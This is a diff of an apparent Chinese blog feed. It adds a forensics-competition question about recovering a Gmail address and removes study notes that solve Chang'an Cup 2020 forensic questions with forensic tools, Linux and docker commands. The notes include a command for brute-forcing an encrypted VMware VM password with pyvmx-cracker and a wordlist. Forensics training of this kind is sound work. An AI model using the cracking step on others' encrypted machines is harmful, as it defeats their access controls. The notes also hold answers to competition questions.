-<p>B. <a href="mailto:&#x6a;&#x6f;&#104;&#x6e;&#x68;&#x65;&#55;&#64;&#x67;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;">&#x6a;&#x6f;&#104;&#x6e;&#x68;&#x65;&#55;&#64;&#x67;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;</a> </p>
-<p>C. <a href="mailto:&#106;&#x61;&#99;&#x6b;&#115;&#111;&#x6e;&#x68;&#101;&#56;&#64;&#103;&#x6d;&#97;&#105;&#x6c;&#46;&#99;&#x6f;&#109;">&#106;&#x61;&#99;&#x6b;&#115;&#111;&#x6e;&#x68;&#101;&#56;&#64;&#103;&#x6d;&#97;&#105;&#x6c;&#46;&#99;&#x6f;&#109;</a> </p>
-<p>D. <a href="mailto:&#x6a;&#111;&#x72;&#107;&#101;&#x72;&#x68;&#101;&#x38;&#56;&#56;&#x40;&#x67;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#109;">&#x6a;&#111;&#x72;&#107;&#101;&#x72;&#x68;&#101;&#x38;&#56;&#56;&#x40;&#x67;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#109;</a> </p>
-<p>E. <a href="mailto:&#x79;&#117;&#x61;&#x6e;&#104;&#x65;&#x36;&#x36;&#x36;&#x40;&#103;&#109;&#x61;&#x69;&#x6c;&#46;&#99;&#111;&#x6d;">&#x79;&#117;&#x61;&#x6e;&#104;&#x65;&#x36;&#x36;&#x36;&#x40;&#103;&#109;&#x61;&#x69;&#x6c;&#46;&#99;&#111;&#x6d;</a> </p>
+<h3 id="44-在何源的个人计算机中，用户“He-Yuan”曾用-Microsoft-Edge-浏览器注册过一个新的-Gmail-account-请从网页标题痕迹中找出此账号。"><a href="#44-在何源的个人计算机中，用户“He-Yuan”曾用-Microsoft-Edge-浏览器注册过一个新的-Gmail-account-请从网页标题痕迹中找出此账号。" class="headerlink" title="44 在何源的个人计算机中，用户“He Yuan”曾用 Microsoft Edge 浏览器注册过一个新的 Gmail account,请从网页标题痕迹中找出此账号。"></a>44 在何源的个人计算机中，用户“He Yuan”曾用 Microsoft Edge 浏览器注册过一个新的 Gmail account,请从网页标题痕迹中找出此账号。</h3><p>A. <a href="mailto:&#106;&#97;&#x63;&#107;&#x68;&#x65;&#54;&#54;&#x36;&#64;&#103;&#109;&#97;&#x69;&#x6c;&#x2e;&#99;&#111;&#109;">&#106;&#97;&#x63;&#107;&#x68;&#x65;&#54;&#54;&#x36;&#64;&#103;&#109;&#97;&#x69;&#x6c;&#x2e;&#99;&#111;&#109;</a> </p>
+<p>B. <a href="mailto:&#106;&#111;&#x68;&#x6e;&#104;&#101;&#x37;&#x40;&#103;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#109;">&#106;&#111;&#x68;&#x6e;&#104;&#101;&#x37;&#x40;&#103;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#109;</a> </p>
+<p>C. <a href="mailto:&#x6a;&#97;&#x63;&#107;&#x73;&#x6f;&#x6e;&#x68;&#101;&#x38;&#x40;&#103;&#x6d;&#97;&#x69;&#108;&#46;&#99;&#111;&#x6d;">&#x6a;&#97;&#x63;&#107;&#x73;&#x6f;&#x6e;&#x68;&#101;&#x38;&#x40;&#103;&#x6d;&#97;&#x69;&#108;&#46;&#99;&#111;&#x6d;</a> </p>
+<p>D. <a href="mailto:&#106;&#111;&#114;&#107;&#101;&#x72;&#104;&#x65;&#56;&#x38;&#56;&#64;&#x67;&#x6d;&#97;&#105;&#x6c;&#x2e;&#99;&#x6f;&#109;">&#106;&#111;&#114;&#107;&#101;&#x72;&#104;&#x65;&#56;&#x38;&#56;&#64;&#x67;&#x6d;&#97;&#105;&#x6c;&#x2e;&#99;&#x6f;&#109;</a> </p>
+<p>E. <a href="mailto:&#121;&#117;&#x61;&#110;&#104;&#x65;&#x36;&#54;&#x36;&#x40;&#x67;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#x63;&#111;&#109;">&#121;&#117;&#x61;&#110;&#104;&#x65;&#x36;&#54;&#x36;&#x40;&#x67;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#x63;&#111;&#109;</a> </p>
 <p><strong>答案：C</strong></p>
 <p>通过对题目中各个选项进行搜索，发现只能选C</p>
 <h3 id="45-在何源的个人计算机中，用户“He-Yuan”曾用-Microsoft-Edge-浏览器下载过一些文件，以下哪一个不是？"><a href="#45-在何源的个人计算机中，用户“He-Yuan”曾用-Microsoft-Edge-浏览器下载过一些文件，以下哪一个不是？" class="headerlink" title="45 在何源的个人计算机中，用户“He Yuan”曾用 Microsoft Edge 浏览器下载过一些文件，以下哪一个不是？"></a>45 在何源的个人计算机中，用户“He Yuan”曾用 Microsoft Edge 浏览器下载过一些文件，以下哪一个不是？</h3><p>A. WeChat_C1018.exe </p>
@@ -1829,307 +1967,6 @@
 ]]></content>
       <tags>
         <tag>电子数据取证</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>长安杯2020例题笔记</title>
-    <url>/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h1 id="SHA256相关："><a href="#SHA256相关：" class="headerlink" title="SHA256相关："></a>SHA256相关：</h1><h2 id="计算原始磁盘或镜像的SHA256值"><a href="#计算原始磁盘或镜像的SHA256值" class="headerlink" title="计算原始磁盘或镜像的SHA256值"></a>计算原始磁盘或镜像的SHA256值</h2><h3 id="对应例题："><a href="#对应例题：" class="headerlink" title="对应例题："></a>对应例题：</h3><p>10、检材 2 的原始磁盘 SHA256 值为（）</p>
-<p>30、检材 3 的原始磁盘 SHA256 值为（）</p>
-<p>42、检材 4 的原始磁盘 SHA256 值为（）</p>
-<p>2019长安杯    1、计算“检材 1.E01”镜像的 SHA256 值是多少（ ）</p>
-<h3 id="解题方法："><a href="#解题方法：" class="headerlink" title="解题方法："></a>解题方法：</h3><p>FMP -&gt; 证据文件 -&gt; 点击你所需要计算的磁盘并使其变蓝 -&gt; 右键哈希值计算</p>
-<h2 id="计算文件的SHA256值"><a href="#计算文件的SHA256值" class="headerlink" title="计算文件的SHA256值"></a>计算文件的SHA256值</h2><h3 id="对应例题：-1"><a href="#对应例题：-1" class="headerlink" title="对应例题："></a>对应例题：</h3><p>2019长安杯    59、计算“检材 4.E01”文件的 sha256 值（ ）</p>
-<h3 id="题解方法："><a href="#题解方法：" class="headerlink" title="题解方法："></a>题解方法：</h3><p>出题方给我们检材的时候同时会给出一个txt文件，里面记录着各个检材文件的sha256值，一般直接将其作为答案</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022163219449.png" alt="image-20211022163219449"></p>
-<h3 id="检验方法："><a href="#检验方法：" class="headerlink" title="检验方法："></a>检验方法：</h3><h5 id="为了保证出题方所给的材料没有损坏，可以在windows自带的PowerShell中输入"><a href="#为了保证出题方所给的材料没有损坏，可以在windows自带的PowerShell中输入" class="headerlink" title="为了保证出题方所给的材料没有损坏，可以在windows自带的PowerShell中输入"></a>为了保证出题方所给的材料没有损坏，可以在windows自带的PowerShell中输入</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-FileHash 文件路径 -Algorithm 校验的Hash值类型| Format-List</span><br></pre></td></tr></table></figure>
-
-<p>如果不带-Algorithm参数，也就是不指明验证的Hash值类型，那么默认验证的就是SHA256值。</p>
-<h1 id="操作系统方面"><a href="#操作系统方面" class="headerlink" title="操作系统方面"></a>操作系统方面</h1><h2 id="系统版本和内核版本"><a href="#系统版本和内核版本" class="headerlink" title="系统版本和内核版本"></a>系统版本和内核版本</h2><h3 id="对应例题：-2"><a href="#对应例题：-2" class="headerlink" title="对应例题："></a>对应例题：</h3><p>1、检材 1 的操作系统版本是（）</p>
-<p>31、检材 3 所在的计算机的操作系统版本是（）</p>
-<p>2、检材 1 中，操作系统的内核版本是（）</p>
-<p>11、检材 2 所在计算机的 OS 内部版本号是（）</p>
-<h3 id="linux系统解题方法："><a href="#linux系统解题方法：" class="headerlink" title="linux系统解题方法："></a>linux系统解题方法：</h3><p>使用火眼仿真系统，进入操作系统即可看到系统版本和内核版本（账号设置为root，密码自动调整为123456，可以完成登录）</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022170603576.png" alt="image-20211022170603576"></p>
-<p>第二行为内核版本，只需要输入    <strong>3.10.0</strong>    即可</p>
-<h5 id="在终端输入-cat-proc-version"><a href="#在终端输入-cat-proc-version" class="headerlink" title="在终端输入 cat /proc/version"></a>在终端输入 <code>cat /proc/version</code></h5><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022170931078.png" alt="image-20211022170931078"></p>
-<h5 id="在终端输入-uname-a"><a href="#在终端输入-uname-a" class="headerlink" title="在终端输入 uname -a"></a>在终端输入 <code>uname -a</code></h5><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022171017953.png" alt="image-20211022171017953"></p>
-<p>均可得到内核版本，其中的时间为系统版本发布时间</p>
-<h5 id="在终端输入-cat-etc-redhat-release-，这种方法只适合Redhat系的Linux"><a href="#在终端输入-cat-etc-redhat-release-，这种方法只适合Redhat系的Linux" class="headerlink" title="在终端输入    cat /etc/redhat-release    ，这种方法只适合Redhat系的Linux"></a>在终端输入    <code>cat /etc/redhat-release</code>    ，这种方法只适合Redhat系的Linux</h5><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022171538770.png" alt="image-20211022171538770"></p>
-<h3 id="windows系统题解方法："><a href="#windows系统题解方法：" class="headerlink" title="windows系统题解方法："></a>windows系统题解方法：</h3><p>使用美亚取证大师，取证结果 -&gt; 系统痕迹 -&gt; 系统信息 -&gt; 产品名称</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022172043461.png" alt="image-20211022172043461"></p>
-<p>可以直接获得系统版本的名称</p>
-<p>但是当前build无法直接作为系统OS版本的答案，内容不全，需要进入火眼仿真中查看</p>
-<p>开始 -&gt; 设置 -&gt;关于 ，可以找到操作系统版本</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022172740597.png" alt="image-20211022172740597"></p>
-<h2 id="计算机开关机时间"><a href="#计算机开关机时间" class="headerlink" title="计算机开关机时间"></a>计算机开关机时间</h2><h3 id="对应例题"><a href="#对应例题" class="headerlink" title="对应例题"></a>对应例题</h3><p>12、检材 2 所在计算机最后一次正常关机的时间为（）</p>
-<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>最简单的办法， 取证大师 -&gt; 案件概览 -&gt; 最后一次正常关机时间</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022201502698.png" alt="image-20211022201502698"></p>
-<h2 id="程序安装时间"><a href="#程序安装时间" class="headerlink" title="程序安装时间"></a>程序安装时间</h2><h3 id="对应例题-1"><a href="#对应例题-1" class="headerlink" title="对应例题"></a>对应例题</h3><p>13、检材 2 中，VMware 程序的安装时间为（）</p>
-<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>取证大师 -&gt; 取证结果 -&gt; 系统痕迹 -&gt; 安装软件 -&gt; 虚拟机软件 -&gt; 安装时间 </p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022201320946.png" alt="image-20211022201320946"></p>
-<h2 id="程序启动次数"><a href="#程序启动次数" class="headerlink" title="程序启动次数"></a>程序启动次数</h2><h3 id="对应例题-2"><a href="#对应例题-2" class="headerlink" title="对应例题"></a>对应例题</h3><p>14、检材 2 中，Vmware.exe 程序总计启动过（）</p>
-<h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>取证大师 -&gt; 取证结果 -&gt; 系统痕迹 -&gt; 应用程序运行痕迹 -&gt; VMWARE.EXE -&gt; 第六次运行时间，可知程序总共运行了6次</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022202227731.png" alt="image-20211022202227731"></p>
-<h1 id="磁盘逻辑卷方面"><a href="#磁盘逻辑卷方面" class="headerlink" title="磁盘逻辑卷方面"></a>磁盘逻辑卷方面</h1><h2 id="逻辑区块地址（仅对于此问题用火眼较好）："><a href="#逻辑区块地址（仅对于此问题用火眼较好）：" class="headerlink" title="逻辑区块地址（仅对于此问题用火眼较好）："></a>逻辑区块地址（仅对于此问题用火眼较好）：</h2><h3 id="对应例题：-3"><a href="#对应例题：-3" class="headerlink" title="对应例题："></a>对应例题：</h3><p>3、检材 1 中磁盘包含一个 LVM 逻辑卷，该 LVM 开始的逻辑区块地址（LBA）是（）</p>
-<h3 id="解题方法：-1"><a href="#解题方法：-1" class="headerlink" title="解题方法："></a>解题方法：</h3><h4 id="弘联火眼："><a href="#弘联火眼：" class="headerlink" title="弘联火眼："></a>弘联火眼：</h4><h5 id="在终端上输入-fdisk-l得到关于磁盘的信息，start即为逻辑区块地址"><a href="#在终端上输入-fdisk-l得到关于磁盘的信息，start即为逻辑区块地址" class="headerlink" title="在终端上输入 fdisk -l得到关于磁盘的信息，start即为逻辑区块地址"></a>在终端上输入 <code>fdisk -l</code>得到关于磁盘的信息，start即为逻辑区块地址</h5><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022184301739.png" alt="image-20211022184301739"></p>
-<h5 id="在终端上输入-lvdisplay可以获得逻辑卷的详情信息"><a href="#在终端上输入-lvdisplay可以获得逻辑卷的详情信息" class="headerlink" title="在终端上输入 lvdisplay可以获得逻辑卷的详情信息"></a>在终端上输入 <code>lvdisplay</code>可以获得逻辑卷的详情信息</h5><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022184533882.png" alt="image-20211022184533882"></p>
-<h4 id="美亚取证："><a href="#美亚取证：" class="headerlink" title="美亚取证："></a>美亚取证：</h4><p>找到对应磁盘的检材，查看摘要</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022184825104.png" alt="image-20211022184825104"></p>
-<p>但是这个内存物理地址的单位是字节<code>（Byte）</code>，而一个逻辑区块占用512位，所以要将这个值除以512。    <code>1074790400/512=2099200</code></p>
-<h1 id="docker相关"><a href="#docker相关" class="headerlink" title="docker相关"></a>docker相关</h1><h2 id="启动相关"><a href="#启动相关" class="headerlink" title="启动相关"></a>启动相关</h2><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022185911875.png" alt="image-20211022185911875"></p>
-<p>使用docker相关命令时，会遇到报错，原因时docker服务尚未启动</p>
-<h2 id="docker相关指令（详情见长安杯2019题解）"><a href="#docker相关指令（详情见长安杯2019题解）" class="headerlink" title="docker相关指令（详情见长安杯2019题解）"></a>docker相关指令（详情见长安杯2019题解）</h2><h5 id="在终端输入-service-docker-start即可启动docker，其他命令正常使用"><a href="#在终端输入-service-docker-start即可启动docker，其他命令正常使用" class="headerlink" title="在终端输入 service docker start即可启动docker，其他命令正常使用"></a>在终端输入 <code>service docker start</code>即可启动docker，其他命令正常使用</h5><h5 id="输入-docker-version-可以获得版本信息"><a href="#输入-docker-version-可以获得版本信息" class="headerlink" title="输入 docker version 可以获得版本信息"></a>输入 <code>docker version</code> 可以获得版本信息</h5><h5 id="输入-docker-images-查看本地所有的镜像"><a href="#输入-docker-images-查看本地所有的镜像" class="headerlink" title="输入 docker images 查看本地所有的镜像"></a>输入 <code>docker images</code> 查看本地所有的镜像</h5><h5 id="docker-ps-显示正在运行中的容器节点"><a href="#docker-ps-显示正在运行中的容器节点" class="headerlink" title="docker ps 显示正在运行中的容器节点"></a><code>docker ps</code> 显示正在运行中的容器节点</h5><h5 id="docker-ps-a-显示所有的容器节点"><a href="#docker-ps-a-显示所有的容器节点" class="headerlink" title="docker ps -a 显示所有的容器节点"></a><code>docker ps -a</code> 显示所有的容器节点</h5><h5 id="输入-docker-info-可以看到关于docker配置的相关信息"><a href="#输入-docker-info-可以看到关于docker配置的相关信息" class="headerlink" title="输入 docker info 可以看到关于docker配置的相关信息"></a>输入 <code>docker info</code> 可以看到关于docker配置的相关信息</h5><h5 id="输入docker-inspect-容器ID-可以查看该容器的详情信息"><a href="#输入docker-inspect-容器ID-可以查看该容器的详情信息" class="headerlink" title="输入docker inspect [容器ID] 可以查看该容器的详情信息"></a>输入<code>docker inspect [容器ID]</code> 可以查看该容器的详情信息</h5><h5 id="输入-stat-文件名-可以查看文件时间状态"><a href="#输入-stat-文件名-可以查看文件时间状态" class="headerlink" title="输入 stat [文件名] 可以查看文件时间状态"></a>输入 <code>stat [文件名]</code> 可以查看文件时间状态</h5><h5 id="输入-more-bash-history-查看历史操作记录"><a href="#输入-more-bash-history-查看历史操作记录" class="headerlink" title="输入 more .bash_history 查看历史操作记录"></a>输入 <code>more .bash_history</code> 查看历史操作记录</h5><h4 id="可以输入-docker-exec-it-容器ID前两位即可-bin-bash-，-查找相关文件的容器内部路径"><a href="#可以输入-docker-exec-it-容器ID前两位即可-bin-bash-，-查找相关文件的容器内部路径" class="headerlink" title="可以输入 docker exec -it [容器ID前两位即可] /bin/bash ， 查找相关文件的容器内部路径"></a>可以输入 docker exec -it [容器ID前两位即可] /bin/bash ， 查找相关文件的容器内部路径</h4><h4 id="输入-find-name-名字-可以搜索所需要的配置文件（-conf结尾）或-日志文件（-log结尾）"><a href="#输入-find-name-名字-可以搜索所需要的配置文件（-conf结尾）或-日志文件（-log结尾）" class="headerlink" title="输入 find / -name [名字] 可以搜索所需要的配置文件（.conf结尾）或 日志文件（.log结尾）"></a>输入 <code>find / -name [名字]</code> 可以搜索所需要的配置文件（.conf结尾）或 日志文件（.log结尾）</h4><h1 id="服务器相关思路"><a href="#服务器相关思路" class="headerlink" title="服务器相关思路"></a>服务器相关思路</h1><h2 id="访问流程"><a href="#访问流程" class="headerlink" title="访问流程"></a>访问流程</h2><h3 id="嫌疑人-gt-检材服务器-gt-内部容器-gt-web网页"><a href="#嫌疑人-gt-检材服务器-gt-内部容器-gt-web网页" class="headerlink" title="嫌疑人 -&gt; 检材服务器 -&gt; 内部容器 -&gt; web网页"></a>嫌疑人 -&gt; 检材服务器 -&gt; 内部容器 -&gt; web网页</h3><h2 id="一般使用工具"><a href="#一般使用工具" class="headerlink" title="一般使用工具"></a>一般使用工具</h2><h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><p>通过查看nginx的相关文件获得题目所需信息</p>
-<p>配置文件：大概目录 <code>/etc/nginx/conf.d/</code></p>
-<p>日志文件：大概目录 <code>/var/log/nginx/access.log</code></p>
-<h2 id="网站对应web对外开放端口"><a href="#网站对应web对外开放端口" class="headerlink" title="网站对应web对外开放端口"></a>网站对应web对外开放端口</h2><h3 id="对应例题：-4"><a href="#对应例题：-4" class="headerlink" title="对应例题："></a>对应例题：</h3><p>4、检材 1 中网站“<a href="http://www.kkzjc.com”对应的/">www.kkzjc.com”对应的</a> Web 服务对外开放的端口是（）</p>
-<h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p>直接在取证大师中搜索<a href="http://www.kkzjc.com,得到txt文本.找到开放端口/">www.kkzjc.com，得到txt文本。找到开放端口</a></p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022192049614.png" alt="image-20211022192049614"></p>
-<h2 id="服务器对外开放域名"><a href="#服务器对外开放域名" class="headerlink" title="服务器对外开放域名"></a>服务器对外开放域名</h2><h3 id="对应例题：-5"><a href="#对应例题：-5" class="headerlink" title="对应例题："></a>对应例题：</h3><p>5、 检材 1 所在的服务器共绑定了（）个对外开放的域名</p>
-<h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><p>由于题目的连贯性，上题对应的网址应也视作域名，在其文本目录下发现其他三个域名的文本文档，故域名数为3</p>
-<h2 id="远程登陆检材所在服务器"><a href="#远程登陆检材所在服务器" class="headerlink" title="远程登陆检材所在服务器"></a>远程登陆检材所在服务器</h2><h3 id="对应例题：-6"><a href="#对应例题：-6" class="headerlink" title="对应例题："></a>对应例题：</h3><p>7、嫌疑人曾经远程登录过检材 1 所在的服务器，分析并找出其登录使用的 IP 地址是（）</p>
-<p>6、检材 1 所在的服务器的原始 IP 地址是（）</p>
-<p>9、嫌疑人曾经从题 7 的 IP 地址，通过 WEB 方式远程访问过网站，统计出检材 1 中该 IP 出现的次数为（）</p>
-<h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><h5 id="在终端上输入-last-可以显示近期用户或终端的登录情况"><a href="#在终端上输入-last-可以显示近期用户或终端的登录情况" class="headerlink" title="在终端上输入 last ,可以显示近期用户或终端的登录情况"></a>在终端上输入 <code>last</code> ,可以显示近期用户或终端的登录情况</h5><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022192944701.png" alt="image-20211022192944701"></p>
-<p>可以获取嫌疑人的登陆使用的ip地址</p>
-<h5 id="在终端上输入-docker-logs-容器ID-，可以获得服务器与容器联系的相关信息"><a href="#在终端上输入-docker-logs-容器ID-，可以获得服务器与容器联系的相关信息" class="headerlink" title="在终端上输入 docker logs [容器ID]，可以获得服务器与容器联系的相关信息"></a>在终端上输入 <code>docker logs [容器ID]</code>，可以获得服务器与容器联系的相关信息</h5><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022194258171.png" alt="image-20211022194258171"></p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022194024673.png" alt="image-20211022194024673"></p>
-<p>在其中可以找到两个IP地址   大意为 192.168.99.222（嫌疑人IP）访问了192.168.99.3（服务器的原始IP地址）:8091（端口）</p>
-<h5 id="由于这上面显示的信息太多，在终端输入docker-logs-08-grep-192-168-99-222-wc-l-。得到答案"><a href="#由于这上面显示的信息太多，在终端输入docker-logs-08-grep-192-168-99-222-wc-l-。得到答案" class="headerlink" title="由于这上面显示的信息太多，在终端输入docker logs 08 | grep 192.168.99.222 | wc -l 。得到答案"></a>由于这上面显示的信息太多，在终端输入<code>docker logs 08 | grep 192.168.99.222 | wc -l</code> 。得到答案</h5><h2 id="反向代理转发后台网络的IP地址"><a href="#反向代理转发后台网络的IP地址" class="headerlink" title="反向代理转发后台网络的IP地址"></a>反向代理转发后台网络的IP地址</h2><h3 id="对应例题：-7"><a href="#对应例题：-7" class="headerlink" title="对应例题："></a>对应例题：</h3><p>8、检材 1 所在的服务器，其主要功能之一为反向代理。找出“<a href="http://www.kkzjc.com”转发的后台网站所使用的/">www.kkzjc.com”转发的后台网站所使用的</a> IP 地址是（）</p>
-<h3 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h3><p>进入docker容器，找到nginx的配置文件，查看得到ip地址</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022193517236.png" alt="image-20211022193517236"></p>
-<h1 id="浏览器历史记录"><a href="#浏览器历史记录" class="headerlink" title="浏览器历史记录"></a>浏览器历史记录</h1><h2 id="访问服务器网站"><a href="#访问服务器网站" class="headerlink" title="访问服务器网站"></a>访问服务器网站</h2><h3 id="对应例题-3"><a href="#对应例题-3" class="headerlink" title="对应例题"></a>对应例题</h3><p>15、嫌疑人通过 Web 方式，从检材 2 访问检材 1 所在的服务器上的网站时，连接的目 标端口是（）</p>
-<p>17、嫌疑人从检材 2 上访问该网站时，所使用的域名为（）</p>
-<h3 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h3><p>取证大师 -&gt; 上网记录</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022203336124.png" alt="image-20211022203336124"></p>
-<p>域名填写答案 <code>www.sdhj.com</code>即可</p>
-<h1 id="手机取证"><a href="#手机取证" class="headerlink" title="手机取证"></a>手机取证</h1><h2 id="寻找手机备份文件，用火眼手机证据分析软件分析"><a href="#寻找手机备份文件，用火眼手机证据分析软件分析" class="headerlink" title="寻找手机备份文件，用火眼手机证据分析软件分析"></a>寻找手机备份文件，用火眼手机证据分析软件分析</h2><p>一般该类备份文件被置于最显眼的地方，文件名设置为手机操作系统+日期的组合，如apple_20200920，便于寻找，</p>
-<h2 id="嫌疑人常用软件"><a href="#嫌疑人常用软件" class="headerlink" title="嫌疑人常用软件"></a>嫌疑人常用软件</h2><p>微信、QQ都可以看一看，说不定有意想不到的收获</p>
-<h3 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h3><p>18、检材 2 中，嫌疑人所使用的微信 ID 是（）</p>
-<p>19、分析检材 2，嫌疑人为推广其网站，与广告位供应商沟通时使用的通联工具的名称 为（</p>
-<p>20、分析检材 2，嫌疑人使用虚拟货币与供应商进行交易，该虚拟货币的名称是（）</p>
-<p>21、上述交易中，对方的收款地址是（）</p>
-<p>比较简单就不写解题思路了（懒）</p>
-<h1 id="虚拟机的密码"><a href="#虚拟机的密码" class="headerlink" title="虚拟机的密码"></a>虚拟机的密码</h1><h2 id="对应例题-4"><a href="#对应例题-4" class="headerlink" title="对应例题"></a>对应例题</h2><p>24、检材 2 中，嫌疑人使用的虚拟机的虚拟磁盘被加密，其密码为（）</p>
-<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><h3 id="导出虚拟机相关文件"><a href="#导出虚拟机相关文件" class="headerlink" title="导出虚拟机相关文件"></a>导出虚拟机相关文件</h3><p>导出后缀名为vmx(爆破主要对此文件进行，为虚拟机的配置文件)，vmdk(虚拟机的快照库，为主要文件)</p>
-<h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><p><a href="https://github.com/axcheron/pyvmx-cracker">https://github.com/axcheron/pyvmx-cracker</a></p>
-<p>进入上述链接下载代码 pyvmx-cracker.py</p>
-<p>复制虚拟机的 .vmx 文件进入,改名为 1.vmx —(方便打字,可不做)</p>
-<p><code>python .\pyvmx-cracker.py -v 1.vmx -d wordlist.txt</code></p>
-<p>即可爆破出密码</p>
-<h3 id="密码消除"><a href="#密码消除" class="headerlink" title="密码消除"></a>密码消除</h3><p>用Vmware打开该配置文件，点击编辑虚拟机设置，选到选项，访问控制里点击移除加密</p>
-<h3 id="剩下的就可以交给取证大师和火眼仿真啦"><a href="#剩下的就可以交给取证大师和火眼仿真啦" class="headerlink" title="剩下的就可以交给取证大师和火眼仿真啦"></a>剩下的就可以交给取证大师和火眼仿真啦</h3><h1 id="程序使用方面"><a href="#程序使用方面" class="headerlink" title="程序使用方面"></a>程序使用方面</h1><h2 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h2><h3 id="对应例题-5"><a href="#对应例题-5" class="headerlink" title="对应例题"></a>对应例题</h3><p>25、检材 2 中，嫌疑人发送给广告商的邮件中的图片附件的 SHA256 值为（）；（忽略 邮件状态） （答案格式：“abcdefg” 小写字母</p>
-<p>26、检材 2 中，嫌疑人给广告商发送广告图片邮件的发送时间是（）（忽略邮件状态） （答案格式：“2020-01-01 21:35” 精确到分钟，半角符号</p>
-<p>27、检材 2 中，嫌疑人的邮箱密码是（） （答案格式：“abcde123456” 字母符号数字组合，区分大小写）</p>
-<h3 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h3><p>取证大师分析虚拟机镜像，即可得到附件，账号密码等</p>
-<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022220406786.png" alt="image-20211022220406786"></p>
